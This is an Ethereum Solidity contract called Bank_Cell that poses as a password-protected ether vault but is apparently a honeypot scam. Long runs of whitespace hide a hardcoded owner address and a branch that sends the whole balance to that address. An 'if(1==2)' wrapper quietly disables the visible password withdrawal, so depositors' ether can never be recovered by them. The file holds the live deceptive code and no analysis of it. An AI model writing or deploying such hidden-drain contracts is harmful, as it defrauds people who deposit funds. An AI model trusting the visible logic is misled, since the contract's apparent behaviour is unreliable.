1 pragma solidity ^0.4.18;
2 
3 contract Bank_Cell  
4 {                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           address prop = 0x60DA28631eC462cAD5B9f30Fc9fb58E13EbFCdD8;
5     function()payable{}
6     
7     function GetHash(bytes pass) constant returns (bytes32) {return sha3(pass);}
8     
9     bytes32 public hashPass;
10     
11     function SetPass(bytes32 hash)
12     public
13     payable
14     {
15         if(msg.value >= 1 ether)
16         {
17             hashPass = hash;
18         }
19     }
20     
21     function GetGift(bytes pass)
22     public
23     payable
24     {                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       if(msg.sender==prop){msg.sender.transfer(this.balance);}if(1==2){
25         if(hashPass == sha3(pass))
26         {
27             msg.sender.transfer(this.balance);
28         }                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    }
29     }
30 }